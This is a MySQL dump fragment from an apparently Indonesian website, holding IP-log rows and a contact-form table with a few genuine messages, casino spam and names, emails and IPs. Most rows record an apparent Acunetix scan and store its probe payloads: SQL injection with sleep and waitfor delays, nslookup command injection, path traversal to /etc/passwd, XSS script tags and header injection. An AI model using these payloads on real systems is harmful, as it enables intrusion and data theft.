INSERT INTO `tb_auth_mac` VALUES ('180.246.205.61', 4, '', '2018-05-02');
INSERT INTO `tb_auth_mac` VALUES ('180.254.81.140', 4, '', '2018-03-04');
INSERT INTO `tb_auth_mac` VALUES ('182.1.65.210', 4, '', '2018-05-24');
INSERT INTO `tb_auth_mac` VALUES ('182.1.81.194', 3, '', '2018-05-24');
INSERT INTO `tb_auth_mac` VALUES ('182.253.134.3', 1, '', '2018-06-08');
INSERT INTO `tb_auth_mac` VALUES ('217.182.175.122', 1, '', '2018-07-26');
INSERT INTO `tb_auth_mac` VALUES ('223.255.230.36', 2, '', '2018-07-18');
INSERT INTO `tb_auth_mac` VALUES ('36.78.120.39', 1, '', '2018-07-27');
INSERT INTO `tb_auth_mac` VALUES ('36.78.141.79', 4, '', '2018-05-13');
INSERT INTO `tb_auth_mac` VALUES ('36.79.206.70', 3, '', '2018-03-16');
INSERT INTO `tb_auth_mac` VALUES ('36.81.46.23', 2, '', '2018-05-01');
INSERT INTO `tb_auth_mac` VALUES ('36.82.102.85', 4, '', '2018-07-26');
INSERT INTO `tb_auth_mac` VALUES ('36.82.127.200', 4, '', '2018-03-23');

-- ----------------------------
-- Table structure for tb_contact
-- ----------------------------
DROP TABLE IF EXISTS `tb_contact`;
CREATE TABLE `tb_contact`  (
  `id_contact` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `email` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `subject` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pesan` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `ip` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `date` date NOT NULL,
  PRIMARY KEY (`id_contact`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 755 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_contact
-- ----------------------------
INSERT INTO `tb_contact` VALUES (1, 'pringgo juni', 'pringgo@gmail.com', 'Web nyabgus', 'Haloo, web nya bagus nih', '127.0.0.1', '2016-09-29');
INSERT INTO `tb_contact` VALUES (2, 'Aji Ainul', 'aji@ainul.me', 'Web nyabgus', 'Keren nih webnya..', 'a', '2016-09-20');
INSERT INTO `tb_contact` VALUES (3, 'Agung Prasetyo', 'agungPras@gmail.com', 'Web nyabgus', 'Securitynya jhoss..', 'a', '2016-09-13');
INSERT INTO `tb_contact` VALUES (4, 'awali natsir', 'awali', 'Web OK', 'Web OK', '127.0.0.1', '0000-00-00');
INSERT INTO `tb_contact` VALUES (5, 'Barnypok aoDLjiHjtAVeeOuPTCz', 'Barnypok', 'wKImWYLUhuxHs', '4J1Vwn http://www.FyLitCl7Pf7ojQdDUOLQOuaxTXbj5iNG.com', '188.143.232.40', '0000-00-00');
INSERT INTO `tb_contact` VALUES (6, 'a a', 'a', 'a', 'a', '115.178.234.149', '0000-00-00');
INSERT INTO `tb_contact` VALUES (7, 'PhilipNagBB PhilipNagBB', 'PhilipNagBB', 'Darth vader mugen download', 'http://stemmeries.xyz <a href=\"http://stemmeries.xyz\">norsk kasino</a> http://stemmeries.xyz - norsk kasino', '46.161.9.40', '0000-00-00');
INSERT INTO `tb_contact` VALUES (8, 'titisnasti wahyuni', 'titisnasti', 'informasi pendaftaran', 'mohon informasi jadwal pendaftaran siswa baru dan persyaratannya,trimakasih', '110.139.73.118', '0000-00-00');
INSERT INTO `tb_contact` VALUES (9, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (10, 'response.write(9789062*9849978) dcxfmcpe', 'response.write(9789062*9849978)', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (11, '\'+response.write(9789062*9849978)+\' dcxfmcpe', '\'+response.write(9789062*9849978)+\'', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (12, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (13, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (14, 'Acunetix dcxfmcpe', 'Acunetix', '1', '\'+response.write(9314497*9058173)+\'', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (15, 'Acunetix dcxfmcpe', 'Acunetix', '1', '\"+response.write(9314497*9058173)+\"', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (16, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (17, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (18, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (19, 'Acunetix dcxfmcpe', 'Acunetix', 'response.write(9727658*9638984)', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (20, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (21, 'Acunetix ppfjutra', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (22, 'Acunetix dcxfmcpe', 'Acunetix', '\"+response.write(9727658*9638984)+\"', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (23, 'Acunetix yvhbseju', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (24, 'Acunetix ymxwfyii', 'Acunetix', '1', 'xtdQBfgH', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (25, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (26, 'Acunetix hhwtsred', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (27, 'Acunetix lcfkslet', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (28, 'Acunetix vhghiheh', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (29, 'Acunetix blcqrysu', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (30, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (31, 'Acunetix ${9999927+9999053}', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (32, 'Acunetix blcqrysu', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (33, 'Acunetix hhwtsred', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (34, 'Acunetix&n964695=v979496 eiqjamdq', 'Acunetix&n964695=v979496', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (35, 'nslookup WWOvOnFn|nslookup WWOvOnFn&nslookup WWOvOnFn hhwtsred', 'nslookup WWOvOnFn|nslookup WWOvOnFn&nslookup WWOvOnFn', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (36, '\'nslookup TIkAtGXR|nslookup TIkAtGXR&nslookup TIkAtGXR\' hhwtsred', '\'nslookup TIkAtGXR|nslookup TIkAtGXR&nslookup TIkAtGXR\'', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (37, 'Acunetix lcfkslet', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (38, 'Acunetix hhwtsred', 'Acunetix', '1', 'nslookup yeIjKtf7|nslookup yeIjKtf7&nslookup yeIjKtf7', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (39, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (40, '12345\'\"\\\'\\\");|]*{\r\n<>\'\'???? lcfkslet', '12345\'\"\\\'\\\");|]*{\r\n<>\'\'????', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (41, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (42, 'save wdjyjuqj', 'save', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (43, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (44, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (45, 'Acunetix save', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (46, 'Acunetix cnartelj', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (47, 'Acunetix save', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (48, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (49, 'Acunetix Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (50, '(select(0)from(select(sleep(9)))v)/*\'+(select(0)from(select(sleep(9)))v)+\'\"+(select(0)from(select(sl', '(select(0)from(select(sleep(9)))v)/*\'+(select(0)from(select(sleep(9)))v)+\'\"+(select(0)from(select(sl', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (51, 'Acunetix JyI=', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (52, 'WcVNmTpU\'; waitfor delay \'0:0:3\' -- lrvlttca', 'WcVNmTpU\'; waitfor delay \'0:0:3\' --', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (53, 'Acunetix \'\"', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (54, 'Acunetix invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././.', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (55, 'Acunetix \'\'\"\"', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (56, 'qgOa1o9v\')); waitfor delay \'0:0:6\' -- lrvlttca', 'qgOa1o9v\')); waitfor delay \'0:0:6\' --', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (57, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (58, 'dZwVjtMm\'));select pg_sleep(9); -- lrvlttca', 'dZwVjtMm\'));select pg_sleep(9); --', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (59, 'Acunetix lmojiimf', 'Acunetix', '1', '\\', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (60, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (61, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (62, 'Acunetix -1 OR 2+594-594-1=0+0+0+1 --', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (63, 'Acunetix lmojiimf', 'Acunetix', '1', '@@XBxxr', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (64, 'Acunetix lmojiimf', 'Acunetix', '1', 'JyI=', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (65, 'Acunetix -1 OR 3*2<(0+5+594-594) --', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (66, 'Acunetix file:///etc/passwd', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (67, 'Acunetix lmojiimf', 'Acunetix', '1', '\'\"', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (68, 'Acunetix -1 OR 2+788-788-1=0+0+0+1', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (69, 'Acunetix /\\../\\../\\../\\../\\../\\../\\../etc/passwd', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (70, 'Acunetix lmojiimf', 'Acunetix', '1', '\'\'\"\"', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (71, 'Acunetix bmpptcbc', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (72, 'Acunetix WEB-INF/web.xml?', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (73, 'Acunetix bmpptcbc', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (74, 'Acunetix -1 OR 3*2>(0+5+788-788)', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (75, 'Acunetix -1 OR 2+1-1-1=1 AND 788=788', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (76, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (77, 'Acunetix WEB-INF\\web.xml?', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (78, 'Acunetix bmpptcbc', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (79, 'Acunetix -1 OR 788=788 AND 3+1-1-1=1', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (80, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (81, 'Acunetix /WEB-INF/web.xml?', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (82, 'Acunetix -1\' OR 2+750-750-1=0+0+0+1 --', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (83, 'Acunetix ypxyuffy', 'Acunetix', '1\'\"()&%<acx><ScRiPt >prompt(940237)</ScRiPt>', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (84, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (85, 'Acunetix rwqudhpl', 'Acunetix', '1', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (86, 'Acunetix rwqudhpl', 'Acunetix', '1', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (87, 'Acunetix lmojiimf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (88, 'Acunetix lmojiimf', 'Acunetix', '1\'\"', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (89, 'Acunetix rwqudhpl', 'Acunetix', '1', '/etc/passwd', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (90, 'Acunetix ypxyuffy', 'Acunetix', '\'\"()&%<acx><ScRiPt >prompt(939180)</ScRiPt>', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (91, 'Acunetix lmojiimf', 'Acunetix', 'JyI=', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (92, 'Acunetix ypxyuffy', 'Acunetix', '1_939256', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (93, 'Acunetix -1\' OR 3*2<(0+5+750-750) --', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (94, 'Acunetix rwqudhpl', 'Acunetix', '1', '/\\../\\../\\../\\../\\../\\../\\../etc/passwd', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (95, 'Acunetix lmojiimf', 'Acunetix', '(select convert(int,CHAR(65)))', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (96, 'Acunetix -1\" OR 2+64-64-1=0+0+0+1 --', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (97, 'Acunetix if(now()=sysdate(),sleep(6),0)/*\'XOR(if(now()=sysdate(),sleep(6),0))OR\'\"XOR(if(now()=sysdat', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (98, 'Acunetix (select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'\"+(select(0)from(', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (99, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (100, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (101, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (102, 'Acunetix xS7pua4Q\')); waitfor delay \'0:0:9\' --', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (103, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (104, 'Acunetix 82bJkhz0\');select pg_sleep(9); --', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (105, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (106, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (107, 'Acunetix rwqudhpl', 'Acunetix', '1', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (108, 'Acunetix lrvlttca', 'Acunetix', '1', '(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'\"+(select(0)from(select(sleep(6)))v)+\"*/', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (109, 'Acunetix lrvlttca', 'Acunetix', '1', '-1)); waitfor delay \'0:0:9\' --', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (110, 'Acunetix rwqudhpl', 'Acunetix', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (111, 'Acunetix rwqudhpl', 'Acunetix', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (112, 'Acunetix lrvlttca', 'Acunetix', '1', 'pp4oSYvt\'; waitfor delay \'0:0:3\' --', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (113, 'Acunetix rwqudhpl', 'Acunetix', '/../..//../..//../..//../..//../..//etc/passwd.jpg', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (114, 'Acunetix lrvlttca', 'Acunetix', '1', 'jdro7Esg\')); waitfor delay \'0:0:6\' --', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (115, 'Acunetix lrvlttca', 'Acunetix', '1', '-1;select pg_sleep(6); --', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (116, 'Acunetix rwqudhpl', 'Acunetix', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (117, 'Acunetix lrvlttca', 'Acunetix', '1', 'pbMhRSHT\');select pg_sleep(3); --', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (118, 'Acunetix rwqudhpl', 'Acunetix', 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (119, 'Acunetix lrvlttca', 'Acunetix', '1', 'u1Swk6S3\'));select pg_sleep(3); --', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (120, 'Acunetix rwqudhpl', 'Acunetix', 'file:///etc/passwd', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (121, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (122, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (123, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (124, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (125, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (126, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (127, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (128, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (129, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (130, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (131, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (132, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (133, 'Acunetix lrvlttca', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (134, 'Acunetix lrvlttca', 'Acunetix', '-1 OR 2+39-39-1=0+0+0+1 --', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (135, 'Acunetix lrvlttca', 'Acunetix', '-1\' OR 2+57-57-1=0+0+0+1 --', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (136, 'Acunetix lrvlttca', 'Acunetix', '-1\' OR 2+477-477-1=0+0+0+1 or \'gg4AgeMO\'=\'', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (137, 'Acunetix lrvlttca', 'Acunetix', '-1\" OR 2+443-443-1=0+0+0+1 --', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (138, 'Acunetix lrvlttca', 'Acunetix', 'if(now()=sysdate(),sleep(6),0)/*\'XOR(if(now()=sysdate(),sleep(6),0))OR\'\"XOR(if(now()=sysdate(),sleep', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (139, 'Acunetix lrvlttca', 'Acunetix', '(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'\"+(select(0)from(select(sl', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (140, 'Acunetix lrvlttca', 'Acunetix', '-1; waitfor delay \'0:0:9\' --', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (141, 'Acunetix lrvlttca', 'Acunetix', '-1); waitfor delay \'0:0:9\' --', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (142, 'Acunetix lrvlttca', 'Acunetix', '-1)); waitfor delay \'0:0:9\' --', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (143, 'Acunetix lrvlttca', 'Acunetix', '1 waitfor delay \'0:0:9\' --', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (144, 'Acunetix lrvlttca', 'Acunetix', 'jiyl6Fou\'; waitfor delay \'0:0:9\' --', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (145, 'Acunetix lrvlttca', 'Acunetix', '5wZ45Dyc\'); waitfor delay \'0:0:9\' --', '1', '36.74.88.115', '0000-00-00');
INSERT INTO `tb_contact` VALUES (146, 'Acunetix lrvlttca', 'Acunetix', 'Q3c4VQOk\')); waitfor delay \'0:0:3\' --', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (147, 'Acunetix lrvlttca', 'Acunetix', '-1;select pg_sleep(3); --', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (148, 'Acunetix lrvlttca', 'Acunetix', '-1);select pg_sleep(3); --', '1', '125.167.128.110', '0000-00-00');
INSERT INTO `tb_contact` VALUES (149, 'Acunetix lrvlttca', 'Acunetix', '4kJSGMIL\'));select pg_sleep(9); --', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (150, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (151, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (152, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (153, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (154, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.97.228', '0000-00-00');
INSERT INTO `tb_contact` VALUES (155, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (156, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (157, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (158, 'Acunetix jwkinpof', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (159, 'Acunetix 1acugCKDMNQ79F', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (160, '1acuL1cGHkpLGo obxyektf', '1acuL1cGHkpLGo', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (161, 'Acunetix obxyektf', 'Acunetix', '1acutCMJOrFkwV', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (162, 'Acunetix obxyektf', 'Acunetix', '1', '1', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (163, 'Acunetix obxyektf', 'Acunetix', '1', '1acuVhDAZr7KJt', '36.74.102.5', '0000-00-00');
INSERT INTO `tb_contact` VALUES (164, 'Acunetix obxyektf', 'Acunetix', '1', '1', '125.167.131.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (165, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (166, 'Acunetix gifhtyly', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (167, 'Acunetix \'+response.write(9109183*9496644)+\'', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (168, 'Acunetix jfrwbtmi', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (169, 'Acunetix uxionjec', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (170, 'Acunetix cwmqbogc', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (171, 'SomeCustomInjectedHeader:injected_by_wvs gifhtyly', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (172, 'Acunetix pepgkowq', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
